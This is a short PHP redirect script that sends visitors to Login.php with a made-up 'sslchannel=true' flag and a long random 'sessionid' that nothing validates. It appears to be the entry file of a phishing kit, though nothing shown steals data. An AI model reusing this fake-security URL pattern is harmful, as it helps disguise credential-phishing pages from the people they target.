<?php
/*

 */
require_once '../../includes/functions.php';
header('Location: Login.php?sslchannel=true&sessionid=' . generateRandomString(130));
exit;
?>